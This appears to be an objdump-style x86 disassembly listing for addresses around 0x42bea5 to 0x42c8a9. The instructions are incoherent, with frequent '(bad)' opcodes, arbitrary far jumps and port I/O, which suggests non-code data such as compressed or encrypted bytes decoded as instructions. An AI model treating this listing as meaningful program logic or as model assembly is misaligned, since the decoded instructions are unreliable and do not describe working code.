  42bea5:	scas   eax,DWORD PTR es:[edi]
  42bea6:	out    dx,eax
  42bea7:	mov    ch,0x81
  42bea9:	int3   
  42beaa:	adc    DWORD PTR [edx-0x33],eax
  42bead:	add    eax,0xca94f1f0
  42beb2:	add    BYTE PTR [edx],0x7a
  42beb5:	xor    eax,0x1a23958b
  42beba:	push   eax
  42bebb:	add    eax,0xf803e7a4
  42bec0:	pop    esi
  42bec1:	jbe    0x42bf42
  42bec3:	adc    eax,0x3902f10
  42bec8:	or     al,bl
  42beca:	(bad)  
  42becb:	xchg   edx,eax
  42becc:	pop    ecx
  42becd:	ret    0x3aa7
  42bed0:	stc    
  42bed1:	push   esp
  42bed2:	sbb    BYTE PTR ss:[esi],ah
  42bed5:	mov    esp,0x85a37f62
  42beda:	mov    ss,WORD PTR [eax]
  42bedc:	enter  0xe1cd,0x0
  42bee0:	lahf   
  42bee1:	gs mov ah,0xb4
  42bee4:	push   edx
  42bee5:	dec    ebx
  42bee6:	xchg   DWORD PTR [ebx+0x22227052],esi
  42beec:	mov    ds:0x4b,al
	...
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bf51
  42bf63:	jo     0x42bf5a
  42bf65:	pusha  
  42bf66:	xlat   BYTE PTR ds:[bx]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	mov    esi,0xa1a15973
  42bf73:	add    eax,0x5acb19c7
  42bf78:	lods   eax,DWORD PTR ds:[esi]
  42bf79:	add    BYTE PTR [eax-0x1e],al
  42bf7c:	lea    edi,[ebx+0x9]
  42bf7f:	in     eax,0xee
  42bf81:	gs cli 
  42bf83:	repnz loopne 0x42bfc1
  42bf86:	jle    0x42c006
  42bf88:	add    DWORD PTR [esi-0x40],esi
  42bf8b:	xchg   esp,eax
  42bf8c:	int    0xc9
  42bf8e:	push   ds
  42bf8f:	or     al,0x14
  42bf91:	shr    DWORD PTR ds:0x8d5924e9,1
  42bf97:	mov    ecx,0xcdd0ec45
  42bf9c:	mov    bh,0x98
  42bf9e:	repz inc ebp
  42bfa0:	mov    al,ds:0x20c5ba1b
  42bfa5:	ret    
  42bfa6:	(bad)  
  42bfa7:	mov    dl,0x3f
  42bfa9:	fdiv   QWORD PTR [esi]
  42bfab:	mov    esi,0xd45ebad0
  42bfb0:	dec    eax
  42bfb1:	inc    ebp
  42bfb2:	add    esp,DWORD PTR [edx+ecx*4-0x3a2d323]
  42bfb9:	push   edi
  42bfba:	jno    0x42bfdc
  42bfbc:	sub    al,0xa4
  42bfbe:	lahf   
  42bfbf:	stos   DWORD PTR es:[edi],eax
  42bfc0:	in     eax,0x82
  42bfc2:	lods   eax,DWORD PTR ds:[esi]
  42bfc3:	cwde   
  42bfc4:	pop    ebx
  42bfc5:	sbb    ebp,0x99534395
  42bfcb:	inc    ebx
  42bfcc:	stc    
  42bfcd:	pop    esp
  42bfce:	dec    esi
  42bfcf:	clc    
  42bfd0:	cld    
  42bfd1:	mov    ecx,0xf71670d
  42bfd6:	or     dh,BYTE PTR [ebx+0x4c]
  42bfd9:	lds    esp,FWORD PTR [eax-0x2b445117]
  42bfdf:	popf   
  42bfe0:	inc    edi
  42bfe1:	mov    cl,0xc4
  42bfe3:	mov    dl,BYTE PTR cs:[edi-0x1a]
  42bfe7:	cdq    
  42bfe8:	mov    dh,0x7d
  42bfea:	dec    eax
  42bfeb:	pop    es
  42bfec:	xchg   BYTE PTR [esi-0x7640bf3c],ah
  42bff2:	shl    DWORD PTR [ecx-0x79],cl
  42bff5:	icebp  
  42bff6:	stos   BYTE PTR es:[edi],al
  42bff7:	xor    bl,dl
  42bff9:	fs push cs
  42bffb:	sbb    ebp,ebx
  42bffd:	outs   dx,DWORD PTR ds:[esi]
  42bffe:	mov    edx,0x49c58fbf
  42c003:	mov    cl,0xee
  42c005:	cwde   
  42c006:	dec    edx
  42c007:	add    bh,BYTE PTR [ebp+0x7ecad662]
  42c00d:	jns    0x42c021
  42c00f:	popa   
  42c010:	cmp    esi,ebp
  42c012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c013:	add    dl,ah
  42c015:	loopne 0x42c064
  42c017:	shl    DWORD PTR [ebx+eiz*4],0x72
  42c01b:	sub    eax,0x993c2c37
  42c020:	xchg   esi,eax
  42c021:	and    eax,0x160fff62
  42c026:	mov    dh,0x4b
  42c028:	mov    ah,0x63
  42c02a:	pop    es
  42c02b:	je     0x42c079
  42c02d:	pop    edx
  42c02e:	mov    ah,0xb8
  42c030:	mov    bl,0x2b
  42c032:	sub    dh,BYTE PTR [edx]
  42c034:	mov    dl,0xd8
  42c036:	jo     0x42c070
  42c038:	idiv   ch
  42c03a:	pop    eax
  42c03b:	dec    eax
  42c03c:	xor    DWORD PTR gs:[eax-0x1d434223],ecx
  42c043:	xchg   edx,eax
  42c044:	jo     0x42c09e
  42c046:	rcl    ebp,cl
  42c048:	jo     0x42c08f
  42c04a:	and    BYTE PTR [edx-0x56c626db],bh
  42c050:	scas   eax,DWORD PTR es:[edi]
  42c051:	cdq    
  42c052:	cmp    dl,BYTE PTR [ecx+0x2]
  42c055:	sbb    edi,ecx
  42c057:	jp     0x42c032
  42c059:	add    DWORD PTR [edi+0x157c74fb],ebp
  42c05f:	jb     0x42bfe2
  42c061:	fcmovne st,st(7)
  42c063:	xlat   BYTE PTR ds:[ebx]
  42c064:	je     0x42bffc
  42c066:	xor    BYTE PTR [ebx],dh
  42c068:	cli    
  42c069:	pop    edx
  42c06a:	sbb    bh,BYTE PTR [ebp+0xb]
  42c06d:	imul   eax,DWORD PTR [eax],0x0
	...
  42c0d3:	add    BYTE PTR [eax],al
  42c0d5:	add    BYTE PTR [edx],bh
  42c0d7:	xchg   edx,eax
  42c0d8:	ja     0x42c10c
  42c0da:	push   edi
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	mov    bh,0x6
  42c0e4:	mov    al,0x2c
  42c0e6:	fadd   DWORD PTR [bx+di]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [edi+ecx*2],ah
  42c0f0:	into   
  42c0f1:	add    eax,0x785ffc50
  42c0f6:	rcr    DWORD PTR [ebx-0x49],cl
  42c0f9:	push   ecx
  42c0fa:	mov    ebp,0x38f1e126
  42c0ff:	(bad)  
  42c100:	(bad)  [ebp-0x2a5d8a95]
  42c106:	xchg   esp,eax
  42c107:	mov    edi,0xe531c619
  42c10c:	aas    
  42c10d:	inc    esi
  42c10e:	xchg   esi,eax
  42c10f:	fsubrp st(1),st
  42c111:	mov    BYTE PTR [edx+0x2313ed20],cl
  42c117:	gs scas al,BYTE PTR es:[edi]
  42c119:	out    0x7d,eax
  42c11b:	pop    edi
  42c11c:	ds ror al,cl
  42c11f:	push   ebx
  42c120:	jb     0x42c11a
  42c122:	fbstp  TBYTE PTR [edx]
  42c124:	dec    ebx
  42c125:	mov    edx,?
  42c127:	push   ebp
  42c128:	in     al,0x84
  42c12a:	pushf  
  42c12b:	lods   eax,DWORD PTR ds:[esi]
  42c12c:	sub    BYTE PTR ds:0xafd47aa8,dh
  42c132:	fld    TBYTE PTR [eax-0xd307191]
  42c138:	cmp    BYTE PTR [edx],bh
  42c13a:	je     0x42c1ad
  42c13c:	les    edx,FWORD PTR [esp+eiz*8+0x12]
  42c140:	popf   
  42c141:	pop    eax
  42c142:	arpl   sp,di
  42c144:	adc    cl,BYTE PTR [ecx+0x6a6f485]
  42c14a:	(bad)  
  42c14b:	adc    BYTE PTR [esi+0x42],ah
  42c14e:	rol    BYTE PTR [ebx-0x125e5709],cl
  42c154:	jp     0x42c0fe
  42c156:	sub    BYTE PTR [edx],ah
  42c158:	jmp    0xa5d0:0x7b42c53e
  42c15f:	mov    edi,0xd6e24675
  42c164:	sub    al,0xd5
  42c166:	jns    0x42c165
  42c168:	jecxz  0x42c129
  42c16a:	fild   QWORD PTR ds:0xd28b595a
  42c170:	fdivr  DWORD PTR [edi]
  42c172:	and    ch,bl
  42c174:	push   ds
  42c175:	inc    esi
  42c176:	pop    eax
  42c177:	push   esi
  42c178:	jb     0x42c1b3
  42c17a:	mov    ebp,DWORD PTR [edx]
  42c17c:	shr    BYTE PTR [edx-0x7c],0x3c
  42c180:	sbb    BYTE PTR [edi],bh
  42c182:	sub    DWORD PTR [ebp+ebp*4-0x44],ecx
  42c186:	je     0x42c163
  42c188:	rcr    DWORD PTR [ecx],cl
  42c18a:	push   ecx
  42c18b:	and    edx,edi
  42c18d:	and    esp,DWORD PTR [edi]
  42c18f:	into   
  42c190:	mov    ds:0x1805955,al
  42c195:	jo     0x42c126
  42c197:	sbb    ax,WORD PTR [eax]
  42c19a:	push   ds
  42c19b:	(bad)  
  42c19c:	ins    DWORD PTR es:[edi],dx
  42c19d:	and    DWORD PTR [ecx+0x6bd14e12],ecx
  42c1a3:	cmp    BYTE PTR [ecx+0x52c39ab1],ch
  42c1a9:	mov    dh,0x13
  42c1ab:	rcr    DWORD PTR [edi+0x7b4efaa5],1
  42c1b1:	inc    eax
  42c1b2:	xchg   edx,eax
  42c1b3:	into   
  42c1b4:	iret   
  42c1b5:	adc    eax,0xb6299e93
  42c1ba:	sbb    eax,0x6ab71b8
  42c1bf:	sub    al,0x1b
  42c1c1:	jns    0x42c187
  42c1c3:	stos   BYTE PTR es:[edi],al
  42c1c4:	(bad)  
  42c1c5:	call   0xf01a:0xb02761d4
  42c1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1cd:	sbb    eax,0xb2582bc7
  42c1d2:	(bad)  
  42c1d3:	sub    al,0x1e
  42c1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c1d6:	pop    eax
  42c1d7:	cli    
  42c1d8:	into   
  42c1d9:	and    BYTE PTR [ebp+0x78],ch
  42c1dc:	(bad)  
  42c1dd:	js     0x42c1b3
  42c1df:	jge    0x42c1fd
  42c1e1:	data16 fcomp DWORD PTR [edx]
  42c1e4:	cmp    ecx,ebp
  42c1e6:	xor    bl,BYTE PTR [ebx]
  42c1e8:	mov    ecx,0xe73b5f57
  42c1ed:	in     al,0x0
	...
  42c253:	add    BYTE PTR [eax],al
  42c255:	add    BYTE PTR [ecx-0x7e],ch
  42c258:	int    0xae
  42c25a:	out    dx,eax
  42c25b:	out    dx,eax
  42c25c:	imul   eax,edi,0xfffffff2
  42c25f:	nop
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	cmp    ecx,ebp
  42c264:	inc    eax
  42c265:	cmp    eax,0x1d967
  42c26a:	add    BYTE PTR [ecx],al
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	daa    
  42c26f:	(bad)  
  42c270:	repz out dx,al
  42c272:	jmp    FWORD PTR [ebp+0x1f4ab6ea]
  42c278:	repnz pushf 
  42c27a:	push   0xfffffff9
  42c27c:	ret    
  42c27d:	aam    0x9f
  42c27f:	arpl   WORD PTR [ebp+0x63],dx
  42c282:	leave  
  42c283:	dec    edx
  42c284:	sub    DWORD PTR [ebp-0x25],esp
  42c287:	inc    esp
  42c288:	scas   al,BYTE PTR es:[edi]
  42c289:	addr16 mov ebp,0x9e05bf7c
  42c28f:	ret    0x73e0
  42c292:	iret   
  42c293:	sti    
  42c294:	cmp    esp,DWORD PTR [ecx+0x460afa5d]
  42c29a:	jbe    0x42c2ed
  42c29c:	rol    BYTE PTR [ebp-0x59a12ed1],1
  42c2a2:	and    DWORD PTR [edx+0x2901793d],ebp
  42c2a8:	cld    
  42c2a9:	jnp    0x42c2fe
  42c2ab:	xor    al,0xd4
  42c2ad:	jmp    0x42c2ad
  42c2af:	push   ebp
  42c2b0:	adc    DWORD PTR [ecx-0x65fbc313],esi
  42c2b6:	(bad)  
  42c2b7:	retf   
  42c2b8:	add    al,0x70
  42c2ba:	xchg   esp,eax
  42c2bb:	aad    0xd7
  42c2bd:	(bad)  
  42c2be:	pop    esi
  42c2bf:	jmp    0x42c262
  42c2c1:	jg     0x42c2d6
  42c2c3:	and    DWORD PTR [ebx-0x3ea84d4a],esi
  42c2c9:	dec    eax
  42c2ca:	push   es
  42c2cb:	les    ebx,FWORD PTR [ecx+0x67]
  42c2ce:	data16 jne 0x42c31e
  42c2d1:	push   ds
  42c2d2:	ret    
  42c2d3:	jmp    0x42c349
  42c2d5:	fisub  DWORD PTR [esi-0x46]
  42c2d8:	iret   
  42c2d9:	adc    al,0x47
  42c2db:	mov    ds:0xb5981457,al
  42c2e0:	cdq    
  42c2e1:	add    eax,DWORD PTR [edi+ebx*4]
  42c2e4:	sahf   
  42c2e5:	fwait
  42c2e6:	icebp  
  42c2e7:	shl    DWORD PTR [edi+0x29f84c67],1
  42c2ed:	mov    dh,BYTE PTR [esi+edx*2]
  42c2f0:	out    dx,al
  42c2f1:	or     DWORD PTR [ebx],0x9c5c53d1
  42c2f7:	imul   edx,eax,0x96e9f036
  42c2fd:	xchg   ebx,eax
  42c2fe:	cmp    cl,BYTE PTR [ebx+edx*8]
  42c301:	xchg   esp,eax
  42c302:	xchg   DWORD PTR [ecx],edi
  42c304:	repz push 0xbccf8614
  42c30a:	add    DWORD PTR [edx+0x4cd63746],ebp
  42c310:	dec    ecx
  42c311:	retf   0xf9ef
  42c314:	dec    ebp
  42c315:	add    ch,dh
  42c317:	or     bh,al
  42c319:	xchg   ecx,eax
  42c31a:	mov    dl,0x5c
  42c31c:	mov    eax,0x901c3de1
  42c321:	call   0xa0da:0x79590093
  42c328:	adc    BYTE PTR [edi],ch
  42c32a:	in     al,0xcb
  42c32c:	and    al,0x84
  42c32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c32f:	dec    edx
  42c330:	mov    al,dl
  42c332:	retf   0x4ad7
  42c335:	and    bl,BYTE PTR [ebx+0x40967683]
  42c33b:	mov    cl,0x3
  42c33d:	xor    eax,0xe10040fe
  42c342:	loopne 0x42c2f0
  42c344:	sbb    edx,ebx
  42c346:	xchg   ebp,eax
  42c347:	(bad)  
  42c348:	loope  0x42c33e
  42c34a:	mov    dh,0xd7
  42c34c:	or     DWORD PTR [edi],edi
  42c34e:	jo     0x42c397
  42c350:	add    al,0xad
  42c352:	fs xchg esi,eax
  42c354:	xor    ebx,edi
  42c356:	jnp    0x42c364
  42c358:	fwait
  42c359:	jne    0x42c399
  42c35b:	push   edi
  42c35c:	lock (bad) 
  42c35e:	sub    dl,al
  42c360:	push   edi
  42c361:	stos   DWORD PTR es:[edi],eax
  42c362:	mov    cl,0x9b
  42c364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c365:	es loop 0x42c334
  42c368:	xor    esi,DWORD PTR [eax-0x2f]
  42c36b:	aam    0xf0
  42c36d:	add    al,0x0
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x39704bf6
  42c3e5:	push   0x1da67
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	outs   dx,BYTE PTR ds:[esi]
  42c3ef:	and    eax,0x95de70e8
  42c3f4:	stos   DWORD PTR es:[edi],eax
  42c3f5:	repnz xchg edi,eax
  42c3f7:	xchg   ebx,eax
  42c3f8:	mov    fs,WORD PTR [eax-0x300b7ff8]
  42c3fe:	and    al,0x62
  42c400:	cmp    DWORD PTR ds:0x16f2b111,eax
  42c406:	aam    0xcd
  42c408:	cmp    esp,esp
  42c40a:	pop    edi
  42c40b:	and    DWORD PTR [ebx+0x73],ebx
  42c40e:	scas   al,BYTE PTR es:[edi]
  42c40f:	mov    ch,0x84
  42c411:	imul   ebp,DWORD PTR [ecx-0x37],0xffffffcd
  42c415:	mov    BYTE PTR [esp+ebx*1+0x6e],cl
  42c419:	mov    ch,BYTE PTR [edx]
  42c41b:	pushf  
  42c41c:	hlt    
  42c41d:	jns    0x42c3bc
  42c41f:	mov    al,0x15
  42c421:	sub    eax,0x4b0bd8d3
  42c426:	ins    BYTE PTR es:[edi],dx
  42c427:	jmp    0x6358bcd9
  42c42c:	test   BYTE PTR [esi+0x72],cl
  42c42f:	bound  edi,QWORD PTR [edi-0x247df5d3]
  42c435:	popf   
  42c436:	pop    ss
  42c437:	or     eax,0x7c82c4fe
  42c43c:	aam    0x3a
  42c43e:	xlat   BYTE PTR ds:[ebx]
  42c43f:	mov    dl,0x14
  42c441:	mov    fs,esp
  42c443:	jecxz  0x42c421
  42c445:	loope  0x42c3ce
  42c447:	stos   DWORD PTR es:[edi],eax
  42c448:	rcl    BYTE PTR ds:0xabd38fdc,1
  42c44e:	and    DWORD PTR [edx-0x26208563],ecx
  42c454:	pushf  
  42c455:	inc    ebx
  42c456:	dec    ebp
  42c457:	inc    eax
  42c458:	jmp    0x22734f5e
  42c45d:	out    0x4b,al
  42c45f:	sbb    eax,0x646517e7
  42c464:	retf   
  42c465:	or     BYTE PTR [edi-0x53],dl
  42c468:	dec    edx
  42c469:	(bad)  
  42c46a:	ds pop ebp
  42c46c:	pusha  
  42c46d:	and    BYTE PTR cs:[esi],ch
  42c470:	cmp    al,0x20
  42c472:	pop    edi
  42c473:	add    eax,0x7f8e7b0
  42c478:	cmp    eax,edi
  42c47a:	push   es
  42c47b:	mov    ds:0x3478d57d,eax
  42c480:	in     al,0x95
  42c482:	mov    ecx,0x140107ee
  42c487:	outs   dx,BYTE PTR ds:[esi]
  42c488:	in     eax,0xe4
  42c48a:	adc    esp,DWORD PTR [ebp-0x17259f9a]
  42c490:	xchg   BYTE PTR [esi-0xa],bh
  42c493:	fdiv   st,st(6)
  42c495:	dec    esi
  42c496:	arpl   WORD PTR [esi-0x26bf3940],cx
  42c49c:	in     eax,dx
  42c49d:	sub    eax,0x755373c
  42c4a2:	push   ds
  42c4a3:	dec    edi
  42c4a4:	push   ebp
  42c4a5:	mov    dl,0xfa
  42c4a7:	sub    cl,ah
  42c4a9:	jp     0x42c48f
  42c4ab:	pop    esp
  42c4ac:	push   ebx
  42c4ad:	in     eax,0xf2
  42c4af:	add    eax,0x60dcd754
  42c4b4:	pop    eax
  42c4b5:	adc    eax,0xf7584cc8
  42c4ba:	pop    edi
  42c4bb:	xchg   DWORD PTR [esi],esi
  42c4bd:	shl    DWORD PTR [edi-0x10bf1b87],1
  42c4c3:	push   ebp
  42c4c4:	iret   
  42c4c5:	push   es
  42c4c6:	pop    ss
  42c4c7:	jmp    0xe9fe:0x2fae2a
  42c4ce:	aam    0x1
  42c4d0:	inc    edi
  42c4d1:	dec    edi
  42c4d2:	dec    edx
  42c4d3:	(bad)  [ebp+0x19]
  42c4d6:	pop    ebx
  42c4d7:	xor    esp,DWORD PTR [ebx-0x23]
  42c4da:	xor    eax,0x1191e723
  42c4df:	mov    dh,0xd0
  42c4e1:	push   es
  42c4e2:	sub    esi,esi
  42c4e4:	fmul   st,st(0)
  42c4e6:	and    al,BYTE PTR [ecx+0x2b]
  42c4e9:	xchg   esi,eax
  42c4ea:	aam    0x35
  42c4ec:	dec    edx
  42c4ed:	int    0x0
	...
  42c553:	add    BYTE PTR [eax],al
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x4a34,0x58
  42c564:	fwait
  42c565:	mul    BYTE PTR [edi-0x25]
  42c568:	add    DWORD PTR [eax],eax
  42c56a:	add    BYTE PTR [ecx],al
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	fild   WORD PTR [edi-0x63]
  42c571:	or     DWORD PTR [edi],ebp
  42c573:	mov    dh,0x0
  42c575:	(bad)  
  42c576:	out    dx,al
  42c577:	out    0xea,eax
  42c579:	std    
  42c57a:	mov    eax,0xb43bc19b
  42c57f:	mov    eax,ds:0xfa4e85e6
  42c584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c585:	outs   dx,BYTE PTR ds:[esi]
  42c586:	mov    bl,0x97
  42c588:	lods   eax,DWORD PTR ds:[esi]
  42c589:	aas    
  42c58a:	xchg   esi,eax
  42c58b:	and    al,0x2e
  42c58d:	imul   edi,DWORD PTR [ebp-0x20],0x3f
  42c591:	pop    ds
  42c592:	ror    esp,0x27
  42c595:	(bad)  [esi]
  42c597:	mov    bh,0x73
  42c599:	dec    edx
  42c59a:	out    dx,al
  42c59b:	push   ds
  42c59c:	sub    DWORD PTR [ecx+0x262ac28a],ecx
  42c5a2:	test   al,0xe1
  42c5a4:	mov    gs,WORD PTR [esi]
  42c5a6:	adc    DWORD PTR [eax+0x10],esp
  42c5a9:	adc    ebx,DWORD PTR [ebp+0x6a74ac9e]
  42c5af:	daa    
  42c5b0:	loope  0x42c5b5
  42c5b2:	xchg   ebp,eax
  42c5b3:	jne    0x42c603
  42c5b5:	push   ds
  42c5b6:	sub    edi,DWORD PTR [ecx+0x273a80a1]
  42c5bc:	xor    eax,0x8ea9bced
  42c5c1:	dec    ebx
  42c5c2:	(bad)  
  42c5c3:	sub    eax,0x5c2f5949
  42c5c8:	add    bh,BYTE PTR ds:0x87c3566
  42c5ce:	xchg   edi,eax
  42c5cf:	mov    dh,0x5
  42c5d1:	mov    ch,0x5
  42c5d3:	lds    esi,FWORD PTR [edx+0x79]
  42c5d6:	xor    DWORD PTR [edx],eax
  42c5d8:	inc    ebp
  42c5d9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42c5db:	sbb    BYTE PTR [edi],0xf5
  42c5de:	fist   DWORD PTR [ecx]
  42c5e0:	xchg   ebp,eax
  42c5e1:	idiv   DWORD PTR [esi+0x4c]
  42c5e4:	imul   ebp,esi,0x57
  42c5e7:	pop    ss
  42c5e8:	aas    
  42c5e9:	mov    ah,BYTE PTR [edx+0x1a3b667e]
  42c5ef:	(bad)  
  42c5f0:	stc    
  42c5f1:	bound  esi,QWORD PTR [edi]
  42c5f3:	stc    
  42c5f4:	(bad)  
  42c5f5:	jge    0x42c637
  42c5f7:	rsqrtps xmm7,XMMWORD PTR [ecx-0x12]
  42c5fb:	push   ebx
  42c5fc:	dec    ebx
  42c5fd:	mov    ebx,0xbf4dd346
  42c602:	neg    BYTE PTR ds:0xd2784560
  42c608:	xor    ah,BYTE PTR [ebx]
  42c60a:	int    0xe0
  42c60c:	dec    edx
  42c60d:	shl    DWORD PTR [eax+esi*8-0xe],1
  42c611:	je     0x42c5a9
  42c613:	inc    ebx
  42c614:	test   eax,0x18db4a30
  42c619:	mov    ecx,0xa14c0955
  42c61e:	push   esi
  42c61f:	lea    esi,[ebx+0x53]
  42c622:	push   esi
  42c623:	scas   al,BYTE PTR es:[edi]
  42c624:	retf   
  42c625:	rcr    DWORD PTR [ecx-0x3b],1
  42c628:	loop   0x42c620
  42c62a:	inc    edx
  42c62b:	xchg   esi,eax
  42c62c:	xchg   ebp,eax
  42c62d:	in     eax,dx
  42c62e:	into   
  42c62f:	cwde   
  42c630:	sbb    BYTE PTR [edi+ecx*4+0x8],0xfd
  42c635:	ins    BYTE PTR es:[edi],dx
  42c636:	push   ebp
  42c637:	pop    ds
  42c638:	dec    ebx
  42c639:	div    ch
  42c63b:	jp     0x42c653
  42c63d:	imul   eax,ebx,0x64106d03
  42c643:	pop    ebp
  42c644:	stc    
  42c645:	push   0xffffffca
  42c647:	loope  0x42c66e
  42c649:	test   eax,0x34cd2147
  42c64e:	je     0x42c5ec
  42c650:	cmp    ebx,DWORD PTR [eax+0x2f6b9ac0]
  42c656:	cmp    BYTE PTR [eax+edx*4],bh
  42c659:	fidivr DWORD PTR [esi+esi*4-0x4e]
  42c65d:	imul   ecx,DWORD PTR [ebx+0x76],0x54e8653d
  42c664:	cmp    DWORD PTR [eax+0x7c],0xfffffffb
  42c668:	out    0xc7,al
  42c66a:	dec    edi
  42c66b:	mov    dh,0xce
  42c66d:	inc    edi
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x2f6dfc6b]
  42c6e3:	add    BYTE PTR [edi+edx*2+0x1dc67],ch
  42c6ea:	add    BYTE PTR [ecx],al
  42c6ec:	add    BYTE PTR [eax],al
  42c6ee:	mov    al,ds:0xe7cf6f17
  42c6f3:	dec    esi
  42c6f4:	test   eax,0x1fd0f0b8
  42c6f9:	fadd   st,st(5)
  42c6fb:	fdiv   DWORD PTR [ebx+0x72]
  42c6fe:	mov    dh,0x89
  42c700:	sbb    dl,bh
  42c702:	push   eax
  42c703:	data16 sub BYTE PTR [edi+edi*4],0xd5
  42c708:	out    0x6f,eax
  42c70a:	and    BYTE PTR ds:0x796b7843,ch
  42c710:	xchg   esi,eax
  42c711:	cld    
  42c712:	pop    eax
  42c713:	faddp  st(7),st
  42c715:	and    bl,BYTE PTR [ebp+0x74]
  42c718:	push   edi
  42c719:	mov    bh,0x18
  42c71b:	shl    dl,cl
  42c71d:	fwait
  42c71e:	pop    esp
  42c71f:	jl     0x42c71c
  42c721:	pop    eax
  42c722:	fwait
  42c723:	or     ebp,DWORD PTR [eax+0x3692b399]
  42c729:	idiv   ah
  42c72b:	les    edx,FWORD PTR [eax+0x56a13466]
  42c731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c732:	sub    eax,0x95d199fc
  42c737:	in     eax,0x67
  42c739:	test   al,cl
  42c73b:	nop
  42c73c:	icebp  
  42c73d:	xor    edx,DWORD PTR [eax+esi*4+0x2bd7271b]
  42c744:	in     al,0x4a
  42c746:	xor    BYTE PTR [esi+0x20],0xd5
  42c74a:	push   ebx
  42c74b:	push   esi
  42c74c:	in     eax,dx
  42c74d:	xchg   ecx,eax
  42c74e:	mov    ecx,DWORD PTR [edx+0x54]
  42c751:	aam    0x45
  42c753:	or     ah,ah
  42c755:	or     cl,BYTE PTR [eax+0x7a15ade]
  42c75b:	je     0x42c7ab
  42c75d:	mov    ds:0x301bf8b6,al
  42c762:	aas    
  42c763:	push   esp
  42c764:	cmp    eax,0xb0bd58a2
  42c769:	jmp    0x42c740
  42c76b:	and    ebx,DWORD PTR [edi]
  42c76d:	test   BYTE PTR [ecx-0x4afe8d34],ah
  42c773:	loopne 0x42c7ec
  42c775:	add    DWORD PTR [edi-0x70],0x5
  42c779:	sub    al,0xe6
  42c77b:	int3   
  42c77c:	int3   
  42c77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c77e:	xor    eax,0x16ddfe92
  42c783:	and    ah,dh
  42c785:	xchg   esi,eax
  42c786:	xchg   ecx,eax
  42c787:	mov    ds:0x26ac161b,al
  42c78c:	(bad)  
  42c78d:	mov    eax,0x72792647
  42c792:	call   0xb9b3:0x18d9
  42c798:	shl    BYTE PTR [ebx+0x3f],0x3e
  42c79c:	jmp    0x9fca381e
  42c7a1:	mov    BYTE PTR [eax+0x4e173f3e],bl
  42c7a7:	push   esi
  42c7a8:	sub    al,BYTE PTR [esi-0x632734a4]
  42c7ae:	mov    eax,ds:0xf31d0515
  42c7b3:	jne    0x42c82c
  42c7b5:	cli    
  42c7b6:	ds out 0x69,al
  42c7b9:	rcr    ch,1
  42c7bb:	cmp    eax,0x1e60520b
  42c7c0:	pop    ebx
  42c7c1:	scas   eax,DWORD PTR es:[edi]
  42c7c2:	rol    DWORD PTR ds:0x680c9b84,0xe0
  42c7c9:	stos   DWORD PTR es:[edi],eax
  42c7ca:	loop   0x42c765
  42c7cc:	inc    ebx
  42c7cd:	sbb    eax,0xb818b0e3
  42c7d2:	push   eax
  42c7d3:	call   0x5e28:0x745ae06c
  42c7da:	or     eax,0x3d295f7e
  42c7df:	int    0xfe
  42c7e1:	loop   0x42c7bd
  42c7e3:	or     BYTE PTR [edx-0x52701a7b],cl
  42c7e9:	popf   
  42c7ea:	imul   ebp,DWORD PTR [edi+0x64],0x58
	...
  42c855:	add    BYTE PTR [eax],bh
  42c857:	mov    DWORD PTR [edx-0x6b],ebp
  42c85a:	sti    
  42c85b:	idiv   edi
  42c85d:	lods   eax,DWORD PTR ds:[esi]
  42c85e:	pop    ebp
  42c85f:	sbb    eax,0xdeaca40e
  42c864:	pop    es
  42c865:	jg     0x42c8ce
  42c867:	fld    QWORD PTR [ecx]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [edx+0x76],dl
  42c870:	adc    ebp,ebx
  42c872:	sub    BYTE PTR [ebx+0x4f53b2ba],bh
  42c878:	getsec 
  42c87a:	xor    al,0x17
  42c87c:	sub    BYTE PTR ds:0x15a43226,dh
  42c882:	(bad)  
  42c883:	dec    esp
  42c884:	outs   dx,DWORD PTR ds:[esi]
  42c885:	jmp    0x42c8ae
  42c887:	adc    DWORD PTR [eax-0x54019476],ecx
  42c88d:	dec    DWORD PTR [ecx-0x5d8941d]
  42c893:	loop   0x42c8b5
  42c895:	sar    BYTE PTR [ebx-0x77],cl
  42c898:	outs   dx,BYTE PTR ds:[esi]
  42c899:	(bad)  
  42c89a:	push   ebx
  42c89b:	fstp   TBYTE PTR [ebp+0x6f]
  42c89e:	fild   QWORD PTR [ebx-0x492a781f]
  42c8a4:	pop    ds
  42c8a5:	dec    ebx
  42c8a6:	cs arpl ax,dx
  42c8a9:	out    dx,al
